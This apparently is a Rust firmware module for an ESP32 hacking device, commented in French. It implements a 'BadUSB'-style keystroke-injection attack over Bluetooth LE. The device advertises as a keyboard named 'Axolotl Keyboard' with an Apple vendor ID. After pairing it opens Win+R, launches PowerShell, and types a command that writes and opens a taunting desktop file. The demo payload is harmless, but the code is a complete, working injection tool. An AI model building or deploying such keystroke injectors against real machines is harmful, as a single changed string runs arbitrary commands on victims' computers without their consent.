//! BadUSB via clavier HID **Bluetooth LE** (`esp32-nimble`).
//!
//! Porté depuis `feature/wifi_attacks:src/badusb.rs`. Adaptation menu : le
//! bouton retour (`back`) permet de quitter l'écran d'attente/payload.
//!
//! NOTE : c'est un clavier **BLE** (appairage « Axolotl Keyboard »), pas de
//! l'USB HID natif OTG visé à terme par le CDC — le BLE est le premier jet
//! fonctionnel. Layout clavier **AZERTY (FR)**.

use esp32_nimble::{
    enums::*, hid::*, utilities::mutex::Mutex, BLEAdvertisementData, BLECharacteristic, BLEDevice, BLEHIDDevice,
    BLEServer,
};
use esp_idf_svc::hal::gpio::{Input, PinDriver};
use std::sync::Arc;
use log::info;

const KEYBOARD_ID: u8 = 0x01;
const MEDIA_KEYS_ID: u8 = 0x02;

const HID_REPORT_DESCRIPTOR: &[u8] = hid!(
    (USAGE_PAGE, 0x01),
    (USAGE, 0x06),
    (COLLECTION, 0x01),
    (REPORT_ID, KEYBOARD_ID),
    (USAGE_PAGE, 0x07),
    (USAGE_MINIMUM, 0xE0),
    (USAGE_MAXIMUM, 0xE7),
    (LOGICAL_MINIMUM, 0x00),
    (LOGICAL_MAXIMUM, 0x01),
    (REPORT_SIZE, 0x01),
    (REPORT_COUNT, 0x08),
    (HIDINPUT, 0x02),
    (REPORT_COUNT, 0x01),
    (REPORT_SIZE, 0x08),
    (HIDINPUT, 0x01),
    (REPORT_COUNT, 0x05),
    (REPORT_SIZE, 0x01),
    (USAGE_PAGE, 0x08),
    (USAGE_MINIMUM, 0x01),
    (USAGE_MAXIMUM, 0x05),
    (HIDOUTPUT, 0x02),
    (REPORT_COUNT, 0x01),
    (REPORT_SIZE, 0x03),
    (HIDOUTPUT, 0x01),
    (REPORT_COUNT, 0x06),
    (REPORT_SIZE, 0x08),
    (LOGICAL_MINIMUM, 0x00),
    (LOGICAL_MAXIMUM, 0x65),
    (USAGE_PAGE, 0x07),
    (USAGE_MINIMUM, 0x00),
    (USAGE_MAXIMUM, 0x65),
    (HIDINPUT, 0x00),
    (END_COLLECTION),
);

const SHIFT: u8 = 0x80;
const ALTGR: u8 = 0x40;

// Table AZERTY (FR) : index = code ASCII, valeur = scancode HID (+ SHIFT ou +ALTGR si besoin)
const ASCII_MAP: &[u8] = &[
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 0-7
    0x2a, 0x2b, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, // 8 BS, 9 TAB, 10 LF
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-23
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 24-31
    0x2c, 0x38, 0x20, 0x20 | ALTGR, 0x30, 0x34 | SHIFT, 0x1e, 0x21, // 32 SP ! " # $ % & '
    0x22, 0x2d, 0x31 | SHIFT, 0x2e | SHIFT, 0x10, 0x23, 0x36 | SHIFT, 0x37 | SHIFT, // 40 ( ) * + , - . /
    0x27 | SHIFT, 0x1e | SHIFT, 0x1f | SHIFT, 0x20 | SHIFT, 0x21 | SHIFT, 0x22 | SHIFT, 0x23 | SHIFT, 0x24 | SHIFT, // 48 0-7
    0x25 | SHIFT, 0x26 | SHIFT, 0x37 | SHIFT, 0x36, 0x64, 0x2e, 0x64 | SHIFT, 0x37 | SHIFT, // 56 8 9 : ; < = > ?
    0x27, 0x14 | SHIFT, 0x05 | SHIFT, 0x06 | SHIFT, 0x07 | SHIFT, 0x08 | SHIFT, 0x09 | SHIFT, 0x0a | SHIFT, // 64 @ A B C D E F G
    0x0b | SHIFT, 0x0c | SHIFT, 0x0d | SHIFT, 0x0e | SHIFT, 0x0f | SHIFT, 0x33 | SHIFT, 0x11 | SHIFT, 0x12 | SHIFT, // 72 H I J K L M N O
    0x13 | SHIFT, 0x04 | SHIFT, 0x15 | SHIFT, 0x16 | SHIFT, 0x17 | SHIFT, 0x18 | SHIFT, 0x19 | SHIFT, 0x1d | SHIFT, // 80 P Q R S T U V W
    0x1b | SHIFT, 0x1c | SHIFT, 0x1a | SHIFT, 0x22 | ALTGR, 0x25 | ALTGR, 0x2d | ALTGR, 0x00, 0x25 | SHIFT, // 88 X Y Z [ \ ] ^ _
    0x00, 0x14, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, // 96 ` a b c d e f g
    0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x33, 0x11, 0x12, // 104 h i j k l m n o
    0x13, 0x04, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1d, // 112 p q r s t u v w
    0x1b, 0x1c, 0x1a, 0x21 | ALTGR, 0x23 | ALTGR, 0x2e | ALTGR, 0x1f | ALTGR, 0x00, // 120 x y z { | } ~
];

struct KeyReport {
    modifiers: u8,
    reserved: u8,
    keys: [u8; 6],
}

impl KeyReport {
    fn as_bytes(&self) -> [u8; 8] {
        [
            self.modifiers,
            self.reserved,
            self.keys[0],
            self.keys[1],
            self.keys[2],
            self.keys[3],
            self.keys[4],
            self.keys[5],
        ]
    }
}

pub struct Keyboard {
    server: &'static mut BLEServer,
    input_keyboard: Arc<Mutex<BLECharacteristic>>,
    // Conservés pour garder les caractéristiques HID vivantes côté GATT même si
    // on ne lit/écrit que `input_keyboard` (sinon `dead_code` sous -D warnings).
    #[allow(dead_code)]
    output_keyboard: Arc<Mutex<BLECharacteristic>>,
    #[allow(dead_code)]
    input_media_keys: Arc<Mutex<BLECharacteristic>>,
    key_report: KeyReport,
}

impl Keyboard {
    fn new() -> anyhow::Result<Self> {
        let device = BLEDevice::take();
        device
            .security()
            .set_auth(AuthReq::all())
            .set_io_cap(SecurityIOCap::NoInputNoOutput)
            .resolve_rpa();

        let server = device.get_server();
        let mut hid = BLEHIDDevice::new(server);

        let input_keyboard = hid.input_report(KEYBOARD_ID);
        let output_keyboard = hid.output_report(KEYBOARD_ID);
        let input_media_keys = hid.input_report(MEDIA_KEYS_ID);

        hid.manufacturer("Axolotl");
        hid.pnp(0x02, 0x05ac, 0x820a, 0x0210);
        hid.hid_info(0x00, 0x01);
        hid.report_map(HID_REPORT_DESCRIPTOR);
        hid.set_battery_level(100);

        let ble_advertising = device.get_advertising();
        ble_advertising.lock().scan_response(false).set_data(
            BLEAdvertisementData::new()
                .name("Axolotl Keyboard")
                .appearance(0x03C1)
                .add_service_uuid(hid.hid_service().lock().uuid()),
        )?;
        ble_advertising.lock().start()?;

        Ok(Self {
            server,
            input_keyboard,
            output_keyboard,
            input_media_keys,
            key_report: KeyReport { modifiers: 0, reserved: 0, keys: [0; 6] },
        })
    }

    fn connected(&self) -> bool {
        self.server.connected_count() > 0
    }

    fn write(&mut self, text: &str) {
        for ch in text.as_bytes() {
            self.press(*ch);
            self.release();
        }
    }

    fn press(&mut self, ch: u8) {
        let mut key = ASCII_MAP[ch as usize];
        self.key_report.modifiers = 0;
        if (key & SHIFT) > 0 {
            self.key_report.modifiers |= 0x02;
            key &= !SHIFT;
        }
        if (key & ALTGR) > 0 {
            self.key_report.modifiers |= 0x40;
            key &= !ALTGR;
        }
        self.key_report.keys[0] = key;
        self.send_report(&self.key_report);
    }

    // Presse une touche (scancode brut) avec un modifier (ex: GUI=0x08 pour Win)
    fn press_combo(&mut self, modifier: u8, key: u8) {
        self.key_report.modifiers = modifier;
        self.key_report.keys[0] = key;
        self.send_report(&self.key_report);
        self.release();
    }

    fn release(&mut self) {
        self.key_report.modifiers = 0;
        self.key_report.keys.fill(0);
        self.send_report(&self.key_report);
    }

    fn send_report(&self, keys: &KeyReport) {
        let bytes = keys.as_bytes();
        self.input_keyboard.lock().set_value(&bytes).notify();
        esp_idf_svc::hal::delay::Ets::delay_ms(7);
    }
}

/// Crée le clavier BLE et le renvoie (le menu peut afficher un écran avant de
/// lancer le payload).
pub fn make_keyboard() -> anyhow::Result<Keyboard> {
    Keyboard::new()
}

/// Attend l'appairage puis tape le payload une seule fois. `back` (bouton
/// gauche) permet de quitter l'écran.
pub fn run_payload(mut keyboard: Keyboard, back: &PinDriver<'_, Input>) {
    use esp_idf_svc::hal::delay::FreeRtos;
    let mut deja_tape = false;
    loop {
        if back.is_low() {
            return;
        }
        if keyboard.connected() {
            if !deja_tape {
                info!("Connecte ! Lancement du payload...");
                keyboard.press_combo(0x08, 0x15);
                FreeRtos::delay_ms(800);
                keyboard.write("powershell\n");
                FreeRtos::delay_ms(1500);
                keyboard.write("Set-Content $HOME/Desktop/axolotl.txt 'Axolotl Zero a pris le controle'; Invoke-Item $HOME/Desktop/axolotl.txt\n");
                deja_tape = true;
            }
        } else {
            deja_tape = false;
        }
        FreeRtos::delay_ms(500);
    }
}
